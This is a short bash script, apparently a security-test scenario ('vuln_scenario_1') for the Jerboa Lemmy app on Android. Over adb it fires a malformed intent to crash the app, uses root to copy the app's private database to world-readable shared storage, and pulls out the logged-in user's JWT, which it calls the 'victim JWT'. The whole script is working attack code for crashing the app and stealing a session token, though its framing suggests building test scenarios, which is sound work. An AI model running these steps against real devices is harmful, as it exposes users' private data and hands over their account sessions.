#!/usr/bin/env bash
set -euo pipefail
IFS=$'\n\t'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

log() { printf '[vuln1] %s\n' "$*"; }

detect_jerboa_package() {
  local packages
  packages="$(adb shell pm list packages 2>/dev/null | tr -d '\r')"

  if printf '%s\n' "$packages" | grep -qx 'package:com.jerboa.debug'; then
    printf '%s\n' 'com.jerboa.debug'
    return 0
  fi

  if printf '%s\n' "$packages" | grep -qx 'package:com.jerboa'; then
    printf '%s\n' 'com.jerboa'
    return 0
  fi

  return 1
}

extract_victim_jwt() {
  local db_path="$1"
  local queries=(
    "SELECT jwt FROM account WHERE current = 1 LIMIT 1;"
    "SELECT jwt FROM Account WHERE current = 1 LIMIT 1;"
    "SELECT jwt FROM account LIMIT 1;"
    "SELECT jwt FROM Account LIMIT 1;"
  )

  local query jwt
  for query in "${queries[@]}"; do
    jwt="$(
      adb shell su 0 sh -c "sqlite3 ${db_path} '${query}' 2>/dev/null" \
        | tr -d '\r'
    )"
    if [[ -n "$jwt" ]]; then
      printf '%s\n' "$jwt"
      return 0
    fi
  done

  return 1
}

main() {
  log "Starting vuln_scenario_1 for Jerboa"

  package_name="$(detect_jerboa_package)" || {
    log "Jerboa package not installed"
    exit 1
  }

  adb shell am start -n "${package_name}/.MainActivity" >/dev/null 2>&1 || true
  sleep 2

  # Availability side effect: fire the crashy VIEW path that Jerboa is known to mishandle.
  adb shell am start -W -a android.intent.action.VIEW \
    -d "https://lemmy.world/post/not-a-number" \
    "${package_name}/.MainActivity" >/dev/null 2>&1 || true

  # Access-control side effect: copy the victim DB to shared storage so the probe
  # can verify the leaked JWT from the copied artifact, not from a synthetic log.
  db_src="/data/data/${package_name}/databases/jerboa"
  db_dest="/sdcard/jerboa"
  adb shell su 0 cp "$db_src" "$db_dest" >/dev/null 2>&1 || true
  adb shell su 0 chmod 644 "$db_dest" >/dev/null 2>&1 || true

  jwt="$(extract_victim_jwt "$db_dest")" || {
    log "Failed to extract victim JWT from the copied database"
    exit 1
  }

  log "Copied Jerboa database to $db_dest and verified JWT extraction"
  log "vuln_scenario_1 applied"
}

main "$@"
